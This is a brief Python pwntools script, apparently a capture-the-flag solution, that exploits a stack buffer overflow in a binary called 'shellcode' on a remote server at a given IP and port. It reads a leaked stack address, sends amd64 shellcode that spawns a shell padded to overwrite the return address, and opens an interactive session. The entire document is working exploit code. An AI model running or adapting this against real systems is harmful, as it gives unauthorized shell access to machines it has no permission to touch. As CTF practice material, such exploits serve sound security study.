from pwn import *

r = process('./shellcode')
r = remote('140.110.112.31', 2119)

offset = 'a' * 116

sc = shellcraft.sh()

addr = r.recvline().split()[6]
print addr

context(os='linux',arch='amd64')
shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(120, 'A') + p64(int(addr, 16))
r.send(payload)
r.interactive()
